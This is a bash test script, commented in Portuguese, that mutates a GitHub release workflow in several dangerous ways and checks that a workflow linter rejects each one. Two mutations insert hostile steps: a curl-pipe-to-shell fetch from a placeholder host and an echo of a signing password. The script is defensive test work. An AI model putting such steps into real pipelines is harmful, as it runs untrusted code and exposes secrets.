#!/usr/bin/env bash
# Autoteste do check-workflows.sh: o release.yml real passa, e cada mutação perigosa é reprovada.
# shellcheck disable=SC2016 # as expressões perl levam $1 literal
set -euo pipefail
cd "$(dirname "$0")/.."
tmp="$(mktemp -d)"
trap 'rm -rf "$tmp"' EXIT
fail() { echo "FALHOU (check-workflows): $*" >&2; exit 1; }

./scripts/check-workflows.sh >/dev/null 2>&1 || fail "os workflows reais foram reprovados: $(./scripts/check-workflows.sh 2>&1)"

# mut NOME 'perl-expr' : copia os workflows, aplica a mutação (perl, igual em macOS e Linux) no release.yml e
# exige reprovação
mut() {
  local name="$1" expr="$2" d="$tmp/$1"
  mkdir -p "$d"
  cp .github/workflows/*.yml "$d/"
  perl -0777 -pe "$expr" .github/workflows/release.yml >"$d/release.yml"
  cmp -s .github/workflows/release.yml "$d/release.yml" && fail "mutação '$name' não alterou nada (expressão errada)"
  ./scripts/check-workflows.sh "$d" >"$tmp/o" 2>&1 && fail "mutação '$name' foi aceita"
  return 0
}
mut pull_request 's/^on:\n/on:\n  pull_request:\n    branches: [main]\n/m'
mut dispatch 's/^on:\n/on:\n  workflow_dispatch:\n/m'
mut branch-push 's/^    tags:\n/    branches: [main]\n    tags:\n/m'
mut sha-solto 's/actions\/setup-go\@[0-9a-f]{40}/actions\/setup-go\@v5/'
mut sem-comentario 's/(actions\/upload-artifact\@[0-9a-f]{40}) # v[0-9.]+/$1/'
mut sem-timeout 's/^    timeout-minutes: .*\n//m'
mut cred-persistida 's/persist-credentials: false/persist-credentials: true/'
mut permissao-topo 's/^permissions: \{\}\n/permissions:\n  contents: read\n/m'
mut dois-writes 's/^      contents: read\n/      contents: write\n/m'
mut cancela 's/cancel-in-progress: false/cancel-in-progress: true/'
mut sem-environment 's/^    environment: release\n//m'
mut sem-draft 's/ --draft//'
mut sem-verify-tag 's/ --verify-tag//'
mut ptarget 's/^on:\n/on:\n  pull_request_target:\n/m'
mut curl-sh 's/(\.\/scripts\/ci\.sh\n)/$1      - run: curl -fsSL https:\/\/exemplo.invalid\/x | sh\n/'
mut eco-segredo 's/(          \.\/scripts\/release-sign-macos\.sh --dir dist\n)/$1          echo "\$DEVELOPER_ID_P12_PASSWORD"\n/'

echo "ok check-workflows_test"
